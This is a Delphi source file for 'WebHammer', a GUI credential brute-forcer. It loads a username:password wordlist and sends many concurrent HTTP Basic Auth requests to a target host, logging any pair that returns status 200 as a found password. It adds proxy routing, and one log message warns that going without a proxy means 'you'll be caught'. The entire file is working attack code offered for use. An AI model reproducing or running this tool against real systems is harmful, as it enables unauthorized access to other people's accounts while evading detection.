unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  StdCtrls, Buttons, ComCtrls, ExtCtrls, Grids, HttpProt, Menus, WSocket,
  Gauges, ImgList, jpeg;

type
  TWebHammer = class(TForm)
    Label1: TLabel;
    Host: TEdit;
    Label2: TLabel;
    StartBtn: TBitBtn;
    StopBtn: TBitBtn;
    ClearBtn: TBitBtn;
    ConnectOptions: TGroupBox;
    Bevel1: TBevel;
    Connections: TTrackBar;
    Label4: TLabel;
    Label5: TLabel;
    Timeout: TTrackBar;
    lblcon: TLabel;
    WebResponses: TMemo;
    StatusBar1: TStatusBar;
    GroupBox3: TGroupBox;
    HttpCli1: THttpCli;
    warning: TLabel;
    Label7: TLabel;
    MainMenu1: TMainMenu;
    g1: TMenuItem;
    OpenWordlist1: TMenuItem;
    Exit1: TMenuItem;
    cmbTypetoAttack: TComboBox;
    Label8: TLabel;
    PnlTime: TPanel;
    N1: TMenuItem;
    GroupBox2: TGroupBox;
    Bevel2: TBevel;
    StringGrid1: TStringGrid;
    WSocket1: TWSocket;
    Label6: TLabel;
    ElapsedTime: TTimer;
    Gauge1: TGauge;
    ImgGO: TImage;
    ImgStop: TImage;
    ImgYel: TImage;
    Panel1: TPanel;
    ProxyBox: TGroupBox;
    LblProxyAdd: TLabel;
    LblproxyPort: TLabel;
    lblProxyPass: TLabel;
    lblProxyUser: TLabel;
    TProxyAddress: TEdit;
    TProxyPort: TEdit;
    TProxyUsername: TEdit;
    TProxyPass: TEdit;
    Button1: TButton;
    UseProxyRBtn: TRadioButton;
    procedure FormCreate(Sender: TObject);
    procedure ConnectionsChange(Sender: TObject);
    procedure ClearBtnClick(Sender: TObject);
    procedure TimeoutChange(Sender: TObject);
    procedure Exit1Click(Sender: TObject);
    procedure OpenWordlist1Click(Sender: TObject);
    procedure StartBtnClick(Sender: TObject);
    procedure StopBtnClick(Sender: TObject);
    procedure ElapsedTimeTimer(Sender: TObject);
    procedure N1Click(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure UseProxyRBtnClick(Sender: TObject);
    procedure UseProxyRBtnDblClick(Sender: TObject);

  private
    FFlagAbort    :  Boolean;
    FHttpCliList  :  Tlist;
    TStrList      :  Tstrings;
    Procedure HttpCliItemRequestDone(Sender: TObject;
                                     RqType: THttpRequest; Error : Word);
    Function   InStr(  Index : Integer ;
                        delimeter : Pchar; Text : String): Integer;
    Function   GetCSWord(s : String ; Indx : Integer) : String;
    Function   StripUrl(Url : String): String;
    Procedure  WSocket1DnsLookupDone(Sender: TObject; Error: Word);

    procedure  ShowTraffic(caption : string ; Color : Tcolor;
                             ImgGoShow,ImgYellowShow,ImgStopShow : Boolean);

  { Private declarations}
  public
    Time     : LongInt;


  { Public declarations }
  end;
CONST
 WebMessages: array[1..5] of Pchar =('Initializing All Plugins Pls. Wait...',
                                    'Resolving Host ',
                                    'Starting Running Bots...',
                                    'Can''t Connect to server...',
                                    'Connection Established...');
VAR
  WebHammer: TWebHammer;

Const
  Version = '1.0a';


implementation


{$R *.DFM}

procedure TWebHammer.FormCreate(Sender: TObject);
const
 Heading: array[0..3] of Pchar = ('Target','Type','Username','Password');
var
 i : integer;
begin
 FHttpCliList := Tlist.Create;
 StringGrid1.options:=[Goediting];

 StringGrid1.ColWidths[0]:=230;
 with stringGrid1 do
  for i:=0 to 3 do
  begin
   ColWidths[1+i]:=125;
   Cols[i].Text:=Heading[i];
  end;

 with Connections do
  begin
   Max := 80;
   Min := 10;
   Frequency:=10;
   Position:= 60;
  end;

 Host.text:=LocalHostName;

 CmbTypeToAttack.Items.AddObject('HTTP(Basic Auth)', TObject(vsIcon));
 CmbTypeToAttack.Items.AddObject('HTTP Form', TObject(vsIcon));
 CmbTypeToAttack.Items.AddObject('FTP', TObject(vsIcon));
 CmbTypeToAttack.Items.AddObject('CGI', TObject(vsIcon));
 CmbTypeToAttack.Items.AddObject('POP3', TObject(vsIcon));
 CmbTypeToAttack.Items.AddObject('TELNET', TObject(vsIcon));
 CmbTypeToAttack.ItemIndex:=0;

 WebResponses.Clear;

 Warning.Caption := inttostr(Connections.Position);
 Label7.Caption  := '1';
 StartBtn.Enabled:= FALSE;
 StopBtn.Enabled := FALSE;

end;

procedure TWebHammer.ConnectionsChange(Sender: TObject);
begin
 if Connections.Position <= 30 then
  Warning.Color:=ClGreen
 else if
  Connections.Position <= 60 then
   Warning.Color:=clYellow
 else if
  Connections.Position > 60 then
  Warning.Color:=clRed;

  Warning.caption:=intToStr(Connections.position ) ;
end;

procedure TWebHammer.ClearBtnClick(Sender: TObject);
var
 i : integer;
begin
 WebResponses.Clear;
 for I:= 0 to 3 do begin
    StringGrid1.Cells[I,1]    :='';
    StatusBar1.Panels[I].Text :='';
 end;
 PnlTime.Caption:='';
end;

procedure TWebHammer.TimeoutChange(Sender: TObject);
begin
if TimeOut.Position = 0 then
   label7.caption:=intToStr(TimeOut.Position + 1)
else
   label7.caption:=intToStr(TimeOut.Position * 10);
end;

procedure TWebHammer.Exit1Click(Sender: TObject);
begin
 StopBtn.Click;
 Close;
end;

procedure TWebHammer.OpenWordlist1Click(Sender: TObject);
var
  OpenDialog : TOpenDialog;
  FileName   : String;

begin
  OpenDialog:= TopenDialog.Create(self);
  OpenDialog.Filter := 'Text files (*.txt)|*.txt|All files (*.*)|*.*';
  OpenDialog.FilterIndex := 2; { start the dialog showing all files }
  if OpenDialog.Execute then begin
    FileName:=OpenDialog.Filename;
    TStrlist.Free;
    TStrList := TstringList.Create;
    TStrList.LoadFromFile(FileName);
    StartBtn.Enabled:=TRUE;
    Gauge1.MaxValue:=TstrList.Count;
  end;

  OpenDialog.Free;
end;

{***********************************************************************}
{This OnRequestDone handler is used for the simultaneous request model. }
{It searc the THttpCli Component in the list and remove it.             }
Procedure TWebHammer.HttpCliItemRequestDone(
 Sender : TObject;
 RqType : THttpRequest;
 Error  : Word);
var
  Item     : Integer;
  AHttpCli : THttpCli;
  Count    : Integer;
begin
  AHttpCli := Sender as THttpCli;
  ShowTraffic('Running',clGreen,True,False,False);
  StatusBar1.Panels[1].Text := 'Trying = ' + AHttpCli.Username
                               + ':' + AHttpCli.Password;
  Item:=0;
  if AHttpCli.StatusCode = 200 then begin
     while (item <=100) and (stringGrid1.Cells[0,item]<> '')
      do inc(Item);
      MessageBeep(MB_Ok);
      StringGrid1.Cells[0,item]  := AHttpCli.URL;
      StringGrid1.Cells[1,item]  := 'Basic Authentication';
      StringGrid1.Cells[2,item]  := AHttpCli.UserName;
      StringGrid1.Cells[3,item]  := AHttpCli.Password;
      WebResponses.Lines.Add  ('Possible Password Found...' );
  end;
  Count := FHttpCliList.Count;
  for Item := 1 to Count do begin
      if AHttpCli = FHttpCliList.Items[Item - 1] then begin
          FHttpCliList.Delete(Item - 1);
          break;
      end;
  end;
  {Free the item}
  AHttpCli.Free;
end;


procedure TWebHammer.StartBtnClick(Sender: TObject);
var
  Index,
  TotalList   : Integer;
  AHttpCli    : THttpCli;

begin
  startbtn.Enabled:=False;
  if Host.text = '' then Exit;        //Getthefuckoutahere
  FFlagAbort := FALSE;
  ClearBtn.Click;
  StopBtn.Enabled := TRUE;
  WebResponses.Lines.Add(WebMessages[1]);
  WSocket1.OnDnsLookupDone := WSocket1DnsLookupDone;
  If UseProxyRBtn.Checked then
    WebResponses.Lines.Add('using proxy : ' + TProxyAddress.Text +
                           '   port: ' + TProxyPort.Text + ' as gateway')
  Else
   WebResponses.Lines.Add('not using proxy-you''ll be caught!!!');
  WebResponses.Lines.Add(WebMessages[2] + Host.Text + ' to ');
  Wsocket1.DnsLookUp(StripUrl(Host.Text));

  Index     := 0;
  Time      := 0;
  TotalList := TStrList.Count;
  Host.Enabled := False;
  while (Index <> TotalList) and ( not FFlagAbort) do begin
   if (FHttpCliList.Count < Connections.Position) then begin
     with AHttpCli do begin
       AHttpCli:=THttpCli.Create(self);
       FHttpCliList.Add(AHttpCli);
       Tag := Index;
       URL := Host.Text;
       If UseProxyRBtn.Checked = TRUE then begin
        Proxy         := TProxyAddress.Text;
        ProxyPort     := TProxyPort.Text;
        ProxyUsername := TProxyUsername.Text;
        ProxyPassword := TProxyPass.Text;
       end;
       OnRequestDone := HttpCliItemRequestDone;
       Username := GetCsWord(TStrList[Index],1);
       Password := GetCsWord(TStrList[Index],2);
       HeadAsync               //try snychronous Head Getting
     end;
     Inc(Index);
     StatusBar1.Panels[0].Text := 'Processing ' + intToStr(index) + ' of'
                                + IntTOStr(TStrList.Count) + ' Item(s)';
     ShowTraffic('Throttle',clYellow,False,True,False)
   end
   else begin
     while FHttpClilist.Count > Connections.Position div 2 do
        begin
             Sleep(0);
             Gauge1.Progress:=index;
             Application.ProcessMessages;  {dont burden the Cpu pls.}
             StatusBar1.Panels[2].Text := 'Buffer =  ' +
                                 intToStr(FHttpCliList.Count)
        end;
   end;
  end;
  while FHttpCliList.Count > 0 do begin
     Sleep(0);
     Gauge1.Progress:=index;
     Application.ProcessMessages
  end;
  If Time > 0 then
       WebResponses.Lines.Add('Average hits per second =  ' +
                                inttostr(TotalList Div Time));
  WebResponses.Lines.Add('All Finished');
  StatusBar1.Panels[3].Text:='Disconnected...';
  ShowTraffic('IDLE',clRed,False,False,True);
  Host.Enabled := TRUE;
  ElapsedTime.Enabled := False;
  StartBtn.Enabled:= TRUE;
end;

Procedure TWebHammer.StopBtnClick(Sender: TObject);
var
  Count    : Integer;
  Item     : Integer;
  AHttpCli : THttpCli;

begin
  ElapsedTime.Enabled := FALSE;
  StartBtn.Enabled:=TRUE;
  StopBtn.Enabled:=FALSE;
  FFlagAbort:=TRUE;
  Host.Enabled := TRUE;
  count:=FHttpCliList.Count;
  for Item := 1 To Count do begin
      AHttpCli := THttpCli(FHttpCliList.Items[Item-1]);
      AHttpCli.Abort;
  end;
end;
{* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *}
Procedure TWebhammer.WSocket1DnsLookupDone(Sender: TObject;
  Error: Word);
begin
   case error of
     11001  :
          WebResponses.Lines.Add('Error: Host Not Found...');
     11002  :
          WebResponses.Lines.Add('Error: No route to Host...check ur connections');
     10051  :
          WebResponses.Lines.Add('Error: The network cannot be reached from this host at this time');
     0      :
      begin
        ElapsedTime.Enabled := True;
        FFlagAbort := FALSE;
        StatusBar1.Panels[3].text:='Connection Established...';
        WebResponses.Lines.Add(WSocket1.DnsResult);
        WebResponses.Lines.Add(WebMessages[3]);
        exit  //jump outha here
      end;
     else
          WebResponses.Lines.Add('Error: Unknown Error Encountered!!!');
   end;
      FFlagAbort:=True;
      StatusBar1.Panels[3].Text:=WebMessages[4];
end;

Function TWebhammer.StripUrl(Url : STRING): String;
var
 i  :  integer;
begin
 i:=pos('/',Url);
  if Url[i + 1] = '/' then
     Url:=copy(Url, i + 2, Length(Url));

 i:=pos('/',Url);
  if i > 0 then
     Url:= copy(Url,1,pos('/',Url)-1);
 StripUrl:=Url;
end;

function TWebHammer.GetCSWord(s : String ; Indx : Integer) : String;
//Returns the nth word in a specific field.
var
 Count,
 SPos ,
 EPos : Integer;
begin
   SPos  := 1;
   for Count := 2 To Indx do
       SPos := InStr(SPos, ':',s) + 1;

   EPos := InStr(SPos, ':',s) - 1;
   if EPos <= 0 then EPos := Length(s);
   GetCSWord := Copy(s,SPos, EPos - SPos + 1);
end;

function TWebHammer.InStr(  Index : Integer ;
                            delimeter : Pchar; Text : String): Integer;
var
 pos    : integer;
begin
  Pos:=0;
  while(Index <= Length(Text)) do
   begin
    if(Text[Index] <> deLimeter)then
      inc(Index)
    else begin
      if Index = Length(Text) then
         if(Text[Index] = ':') then
           break;
      Pos:=Index;
      break
    end;
   end;
 InStr:=Pos;
end;

procedure TWebHammer.ElapsedTimeTimer(Sender: TObject);
begin
 inc(Time);
 PnlTime.Caption:=IntToStr(Time);
 Gauge1.Progress:=FhttpCLiList.Count;
end;

procedure TWebhammer.ShowTraffic(caption : string ; Color : Tcolor;
                             ImgGoShow,ImgYellowShow,ImgStopShow : Boolean);
begin
 panel1.caption := caption;
 panel1.Font.Color := Color;
 ImgStop.Visible:= ImgStopShow;
 ImgGo.Visible  := ImgGoShow;
 ImgYel.Visible := ImgYellowShow;
end;

procedure TWebHammer.N1Click(Sender: TObject);
begin
Application.MessageBox(
        'WebHammer Ver. 1 - By: Lenin Cruz - coded in Delphi 5 coz VB sucks - ' +
        'My email : snf77@hotmail.com',
        'About WebHammer',
        MB_OK)
end;

procedure TWebHammer.Button1Click(Sender: TObject);
begin
 if TProxyAddress.Text <> '' then
   UseProxyRBtn.Checked:=True
 else
   UseProxyRBtn.Checked:=False;
  PRoxyBox.Visible:= FALSE;
  ConnectOptions.Visible:=TRUE;
end;

procedure TWebHammer.UseProxyRBtnClick(Sender: TObject);
begin
 PRoxyBox.Visible:= TRUE;
 ConnectOptions.Visible:=False;
end;

procedure TWebHammer.UseProxyRBtnDblClick(Sender: TObject);
begin
 if UseProxyRBtn.Checked then
    UseProxyRBtn.Checked := False;
end;

End. //Program Main Ends
